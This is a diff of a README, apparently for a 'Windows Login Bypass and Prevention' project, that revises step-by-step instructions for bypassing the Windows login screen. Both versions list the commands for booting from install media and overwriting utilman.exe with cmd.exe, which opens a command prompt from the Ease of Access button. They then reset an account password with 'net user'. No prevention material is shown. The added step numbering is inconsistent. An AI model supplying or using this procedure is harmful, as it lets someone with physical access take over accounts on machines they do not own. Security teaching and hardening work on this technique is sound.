@@ -14,78 +14,11 @@ A Computer, Bootable USB for Windows 10
 
 ## Steps
 
-1. Restart and boot from Pendrive and after Install Screen appears then hit Shift + 10 and CMD will open up.
+As you can see how utilman.exe looks like before executing any command
 
-2. X: \Sources>
-```bash
-wmic logicaldisk get name
-```
-
-Output:
-    Name
-    C:
-    D:
-    E:
-    X:
-
-
-3. X: \Sources>
-```bash
-C:
-#the directory which comtains your system files
-```
-
-
-4. C: \>
-```bash
-dir
-```
-
-Output:
-Volume in drive C is System Reserved
-Volume Serial Number is 56E1-426F
-
-Directory of C:\
-    File Not Found
-
-
-5. E: \>
-```bash
-D:
-```
-
-
-6. D: \>
-```bash
-cd Windows
-```
-
-
-7. D: \Windows>
-```bash
-cd System32
-```
-
-
-8. D: \Windows\System32>
-```bash
-ren utilman.exe utilman2.exe
-```
-
-
-9. D: \Windows\System32>
-```bash
-copy cmd.exe utilman.exe
-```
-
-
-10. Click Ease of Access - cmd will open
-
-11. net user username password
-
-
-##Proof of Concept 
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/01.jpg" />
+
+1. Restart and boot from Pendrive and after Install Screen appears then hit Shift + 10 and CMD will open up. OR for some of them steps are Repair your Computer > Troubleshoot > Command Prompt
 
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/02.jpg" />
 
@@ -97,11 +30,36 @@ copy cmd.exe utilman.exe
 
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/06.jpg" />
 
+2. X: \Sources>
+```bash
+C:
+```
+(the directory which comtains your system files)
+
+3. C: \>
+```bash
+cd Windows
+```
+
+4. C: \Windows>
+```bash
+cd System32
+```
+
+5. C: \Windows\System32>
+```bash
+copy cmd.exe utilman.exe
+```
+
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/07.jpg" />
 
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/08.jpg" />
 
+10. Click Ease of Access - cmd will open
+
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/09.jpg" />
+
+11. net user username password
 
 <img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/10.jpg" />
 
